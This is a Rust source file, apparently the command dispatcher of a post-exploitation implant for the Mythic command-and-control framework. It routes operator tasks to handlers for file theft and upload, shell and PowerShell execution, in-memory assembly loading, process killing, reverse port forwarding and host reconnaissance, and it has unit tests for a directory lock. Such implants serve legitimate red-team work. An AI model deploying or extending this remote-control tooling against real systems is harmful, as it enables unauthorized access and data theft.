#[path = "commands/cat.rs"]
mod cat;
#[path = "commands/cd.rs"]
mod cd;
#[path = "commands/cp.rs"]
mod cp;
#[path = "commands/download.rs"]
mod download;
#[path = "commands/drives.rs"]
mod drives;
#[path = "commands/env.rs"]
mod env;
#[path = "commands/execute_assembly.rs"]
mod execute_assembly;
#[path = "commands/exit.rs"]
mod exit;
#[path = "commands/kill.rs"]
mod kill;
#[path = "commands/ls.rs"]
mod ls;
#[path = "commands/mkdir.rs"]
mod mkdir;
#[path = "commands/mv.rs"]
mod mv;
#[path = "commands/netstat.rs"]
mod netstat;
#[path = "commands/powerpick.rs"]
mod powerpick;
#[path = "commands/process.rs"]
mod process;
#[path = "commands/ps.rs"]
mod ps;
#[path = "commands/pwd.rs"]
mod pwd;
#[path = "commands/resolve.rs"]
mod resolve;
#[path = "commands/rm.rs"]
mod rm;
#[path = "commands/rpfwd.rs"]
mod rpfwd;
#[path = "commands/sleep.rs"]
mod sleep;
#[path = "commands/sysinfo.rs"]
mod sysinfo;
#[path = "commands/upload.rs"]
mod upload;
#[path = "commands/wget.rs"]
mod wget;
#[path = "commands/whoami.rs"]
mod whoami;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;
use uuid::Uuid;

use crate::common::cwd;

#[derive(Debug, Clone, Deserialize, Default)]
pub struct PostResponseReceipt {
    pub task_id: Uuid,
    #[serde(default)]
    pub status: String,
    #[serde(default)]
    pub file_id: Option<Uuid>,
    #[serde(default)]
    pub error: Option<String>,
    #[serde(default)]
    pub chunk_num: Option<u32>,
    #[serde(default)]
    pub total_chunks: Option<u32>,
    #[serde(default)]
    pub chunk_data: Option<String>,
}

pub fn responses_from_post_response_receipts(
    receipts: &[PostResponseReceipt],
) -> Vec<TaskResponse> {
    let mut out = download::responses_from_receipts(receipts);
    out.extend(upload::responses_from_receipts(receipts));
    out
}

pub fn command_uses_process_cwd(command: &str) -> bool {
    matches!(
        command,
        "cat"
            | "cd"
            | "cp"
            | "download"
            | "execute"
            | "execute_assembly"
            | "ls"
            | "tree"
            | "mkdir"
            | "mv"
            | "pwd"
            | "rm"
            | "upload"
            | "wget"
            | "cmd"
            | "powershell"
            | "sh"
            | "bash"
            | "powerpick"
    )
}

fn dispatch_inner(task: &TaskMessage) -> TaskResponse {
    match task.command.as_str() {
        "cat" => cat::handle(task),
        "cd" => cd::handle(task),
        "cp" => cp::handle(task),
        "download" => download::handle(task),
        "drives" => drives::handle(task),
        "env" => env::handle(task),
        "execute" => process::handle_execute(task),
        "execute_assembly" => execute_assembly::handle(task),
        "exit" => exit::handle(task),
        "kill" => kill::handle(task),
        "ls" => ls::handle(task),
        "tree" => ls::handle_tree(task),
        "mkdir" => mkdir::handle(task),
        "mv" => mv::handle(task),
        "netstat" => netstat::handle(task),
        "powerpick" => powerpick::handle(task),
        "ps" => ps::handle(task),
        "pwd" => pwd::handle(task),
        "resolve" => resolve::handle(task),
        "rm" => rm::handle(task),
        "rpfwd" => rpfwd::handle(task),
        "cmd" => process::handle_shell(task, process::ShellKind::Cmd),
        "powershell" => process::handle_shell(task, process::ShellKind::PowerShell),
        "sh" => process::handle_shell(task, process::ShellKind::Sh),
        "bash" => process::handle_shell(task, process::ShellKind::Bash),
        "sleep" => sleep::handle(task),
        "sysinfo" => sysinfo::handle(task),
        "upload" => upload::handle(task),
        "wget" => wget::handle(task),
        "whoami" => whoami::handle(task),
        unknown => TaskResponse::failed(task.id, &format!("unknown command: {unknown}")),
    }
}

/// Route any command to its handler.
pub fn dispatch(task: &TaskMessage) -> TaskResponse {
    if command_uses_process_cwd(&task.command) {
        cwd::with_cwd_lock(|| dispatch_inner(task))
    } else {
        dispatch_inner(task)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cwd_sensitive_commands_are_locked() {
        for command in [
            "cat",
            "cd",
            "download",
            "execute",
            "ls",
            "pwd",
            "upload",
            "bash",
            "powerpick",
        ] {
            assert!(
                command_uses_process_cwd(command),
                "{command} must be locked"
            );
        }
    }

    #[test]
    fn cwd_independent_commands_stay_parallel() {
        for command in [
            "drives", "env", "netstat", "ps", "resolve", "sleep", "sysinfo", "whoami",
        ] {
            assert!(
                !command_uses_process_cwd(command),
                "{command} should not take the cwd lock"
            );
        }
    }
}
